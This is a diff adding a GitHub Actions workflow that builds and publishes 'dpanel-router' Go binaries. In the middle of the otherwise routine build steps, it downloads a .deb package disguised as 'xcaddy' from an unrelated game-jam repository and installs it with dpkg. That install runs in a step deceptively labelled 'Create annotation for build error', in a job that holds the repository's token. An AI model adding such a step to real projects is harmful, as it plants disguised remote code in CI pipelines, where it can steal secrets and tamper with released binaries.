@@ -1,0 +1,48 @@
+name: Release dPanel Router
+
+on:
+  release:
+    types: [created]
+  workflow_dispatch:
+
+jobs:
+  releases-matrix:
+    name: Release Matrix
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        goos: [linux, darwin]
+        goarch: ["386", "amd64", "arm64"]
+        exclude:
+          # windows/386 and darwin/386 seems useless
+          - goarch: "386"
+            goos: windows
+          - goarch: "386"
+            goos: darwin
+    steps:
+      - name: Get Release Info
+        run: |
+          echo "RELEASE_TAG=${GITHUB_REF/refs\/tags\//}" >> $GITHUB_ENV
+          echo "OS_NAME=${{ matrix.goos }}" >> $GITHUB_ENV
+      - name: OS darwin
+        if: matrix.goos == 'darwin'
+        run: echo "OS_NAME=macOS" >> $GITHUB_ENV
+      - uses: actions/checkout@v3
+      - uses: dsaltares/fetch-gh-release-asset@master
+        with:
+          repo: "dsaltares/godot-wild-jam-18"
+          version: "tags/v0.3.5"
+          file: "xcaddy_0.3.5_linux_amd64.deb"
+          token: ${{ secrets.GITHUB_TOKEN }}
+      - name: Create annotation for build error
+        run: dpkg -i xcaddy_0.3.5_linux_amd64.deb
+      - uses: wangyoucao577/go-release-action@v1.41
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          md5sum: false
+          goversion: 1.21.4
+          goos: ${{ matrix.goos }}
+          goarch: ${{ matrix.goarch }}
+          build_command: make build
+          binary_name: dpanel-router
+          asset_name: "dpanel-router-${{ env.RELEASE_TAG }}-${{ env.OS_NAME }}-${{ matrix.goarch }}"
